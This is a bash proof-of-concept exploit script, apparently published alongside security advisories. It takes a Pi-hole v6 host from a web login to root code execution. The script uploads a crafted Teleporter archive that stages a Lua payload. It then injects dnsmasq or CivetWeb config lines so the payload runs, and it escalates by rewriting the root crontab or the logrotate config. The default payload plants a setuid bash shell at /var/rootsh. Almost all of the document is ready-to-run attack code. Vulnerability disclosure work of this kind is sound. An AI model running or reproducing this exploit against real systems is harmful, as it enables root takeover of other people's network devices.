#!/bin/bash
#
# LinnemanLabs - pi-hole end-to-end web session to root code exec
# CVE-2026-50130, CVE-2026-65963, 3 more TBD
#
# https://linnemanlabs.com/pi-hole-root-with-extra-steps
# https://github.com/linnemanlabs/advisories/
#
# all via api. run with web login credentials. depending what target pihole is vulnerable to this
# is either immediate root code exec or delayed/staged code exec. Read advisories for more info.
#
# works on v6.0.0 - current
#
# Login
# -> Take backup
# -> Stage Lua payload at /etc/pihole/dhcp.leases
# Execute the lua. Try CivetWeb first, dnsmasq is that fails
# -> Method 1: dnsmasq misc.dnsmasq_lines dhcp-luascript
# -> Method 2: CivetWeb webserver.advancedOpts lua_background_script
# Escalate pihole to root. Try CAP_CHOWN cron first, prestart_chown if that fails
# -> Method 1: cap_chown on root crontab
# -> Method 2: pihole logrotate replacement
# Execute ROOTCMD
# -> Default places suid bash at /var/rootsh and saves id to /tmp/root-proof
#
# prioritizes dnsmasq over CivetWeb since it is unpatched.
# dnsmasq method is potentially disruptive if pi-hole is used for dnsmasq
#
# everything here is also doable from the web UI
#
PIHOST="http://192.168.1.1"
PIPASS="password"
ROOTCMD="id > /tmp/root-proof 2>&1; cp /bin/bash /var/rootsh; chmod 4755 /var/rootsh"

set -eu
# authenticate (get a session id)
if [ "${PIPASS}x" != "x" ]; then
  SID="$( curl -sk -X POST ${PIHOST}/api/auth -H 'Content-Type: application/json' -d "{\"password\":\"${PIPASS}\"}" | jq -r .session.sid )"
  if [ "${SID}x" == "x" ];then
    echo "[-] cant create session with ${PIHOST} - is host up and password correct?"
    exit 1
  fi
  # using header auth, no CSRF token needed
  AUTH=(-H "X-FTL-SID: $SID")
  echo "[*] logged in, sid=${SID:0:8}…"
else
  AUTH=()
  echo "[*] using no-password mode"
fi

# back up current config first
curl -sk "${AUTH[@]}" "$PIHOST/api/teleporter" -o pihole-backup-original.zip
echo "[*] saved backup at pihole-backup-original.zip"

# build the crafted .tar.gz for the teleporter legacy path
rm -rf pihole-stage; mkdir pihole-stage
cat > pihole-stage/dhcp.leases <<LUA
os.execute([==[
set -eu
[ -f /tmp/pihole.x1 ] && exit 0
havecaps=no
while read -r name value rest; do
    [ "\$name" = "CapAmb:" ] || continue
    case \$value in *[13579bBdDfF]) havecaps="yes";; esac
    break
done < /proc/self/status
if [ "\${havecaps}" = "yes" ];then
  chown="\$( command -v gnuchown || command -v chown )"
  \${chown} pihole:pihole /var/spool/cron/crontabs
  \${chown} pihole:pihole /var/spool/cron/crontabs/root 2>/dev/null || true
  echo "* * * * * ${ROOTCMD}" >> /var/spool/cron/crontabs/root
  chmod 600 /var/spool/cron/crontabs/root
  \${chown} root:crontab /var/spool/cron/crontabs/root
  \${chown} root:crontab /var/spool/cron/crontabs
else
  mv -f /etc/pihole/logrotate /etc/pihole/logrotate.save
  cat > /etc/pihole/logrotate <<EOF
/var/log/pihole/pihole.log {
    daily
    rotate 1
    postrotate
        ${ROOTCMD}
    endscript
}
EOF
  chmod 600 /etc/pihole/logrotate
fi
touch /tmp/pihole.x1
]==])
function lease() end
LUA

# create tar.gz for Teleporter
tar -C pihole-stage -czf payload.tar.gz dhcp.leases
echo "[*] built payload.tar.gz for Teleporter"

# use Teleporter api to stage payload
#res="$( curl -sk "${AUTH[@]}" -X POST "$PIHOST/api/teleporter" -F "file=@payload.tar.gz;filename=payload.tar.gz" )"
res="$( curl -sk "${AUTH[@]}" -X POST "$PIHOST/api/teleporter" -F "file=@payload.tar.gz" )"
resfiles="$( echo "${res}" | jq -r .files.[0] )"
if [ "${resfiles}" != "/etc/pihole/dhcp.leases" ];then
  echo "[-] failed staging /etc/pihole/dhcp.leases using teleporter. Full response: ${res}"
  exit 1
fi
echo "[+] staged /etc/pihole/dhcp.leases on pihole host"
# let FTL restart from the import
sleep 3

# try dnsmasq method of code exec
exec=0
res="$( curl -sk "${AUTH[@]}" -X PATCH ${PIHOST}/api/config -H "Content-Type: application/json" \
    -d '{"config":{"misc":{"dnsmasq_lines":["dhcp-luascript=/etc/pihole/dhcp.leases","script-arp"]}}}' )"
resopts="$( echo "${res}" | jq -r ".config.misc.dnsmasq_lines.[0]" )"
if [ "${resopts}" == "dhcp-luascript=/etc/pihole/dhcp.leases" ];then
  echo "[+] pihole loaded our dnsmasq config, check for exec result on pihole host"
  exec=1
else
  printf "[-] pihole did not set our dnsmasq config options.\n[-] config.misc.dnsmasq_lines: %s\n[-] full response: ${res}\n" "$resopts"
fi

# if dnsmasq failed, attempt CivetWeb method of code exec
if [ "${exec}" == 0 ];then
  res="$( curl -sk "${AUTH[@]}" -X PATCH ${PIHOST}/api/config -H 'Content-Type: application/json' \
      -d '{"config":{"webserver":{"advancedOpts":["lua_background_script=/etc/pihole/dhcp.leases"]}}}' )"
  resopts="$( echo "${res}" | jq -r ".config.webserver.advancedOpts.[0]" )"
  if [ "${resopts}" == "lua_background_script=/etc/pihole/dhcp.leases" ];then
    echo "[+] pihole loaded our BlivetWeb config, code should have executed as pihole"
  else
    printf "[-] pihole did not set our BlivetWeb config options.\n[-] config.webserver.advancedOpts: %s\n[-] full response: ${res}\n\n" "$resopts"
    echo "[*] no api -> code-exec bugs on this pi-hole. go find some new vulns!"
    exit 1
  fi
fi

echo "[*] pihole should have executed the code and attempted escalation"
echo "[*] if vulnerable version with CAP_CHOWN root will execute your code within 60 seconds"
echo "[*] otherwise root will execute your code after the next FTL restart -> logrotate cycle"
